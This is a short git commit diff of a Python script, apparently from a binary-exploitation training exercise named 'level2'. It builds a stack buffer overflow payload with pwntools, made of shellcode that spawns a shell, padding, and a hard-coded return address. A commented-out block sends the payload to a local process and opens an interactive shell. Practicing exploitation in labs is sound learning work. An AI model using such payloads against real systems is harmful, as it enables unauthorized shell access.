62ce6357abd94d8c1b24fe36fac1d622642427b0
xray <morel.clement@proton.me>
2026-01-19 15:44:03 +0100

    python script

--- level2/Ressources/main.py
+++ level2/Ressources/main.py
@@ -2,4 +2,32 @@ import pwn
 
 
 shellcode = pwn.asm(pwn.shellcraft.sh())
-print(shellcode, len(shellcode))
+s_len = len(shellcode)
+
+# adress 0x0804a008 
+adress = b"\x08\xa0\x04\x08"
+
+
+payload = shellcode + b'A'* (80 - s_len) + adress
+
+print(payload)
+
+# from pwn import *
+#
+# p = process('./level2')
+#
+# shellcode = asm(shellcraft.sh())
+# s_len = len(shellcode)
+#
+# # address = '0x0804a008'
+# address = b"\x08\xa0\x04\x08"
+#
+# payload = shellcode + b'A' * (80 - s_len) + address
+#
+# print("FAIRYTAIL:")
+# print(payload)
+# print("MAEL")
+#
+# p.sendline(payload)
+#
+# p.interactive()
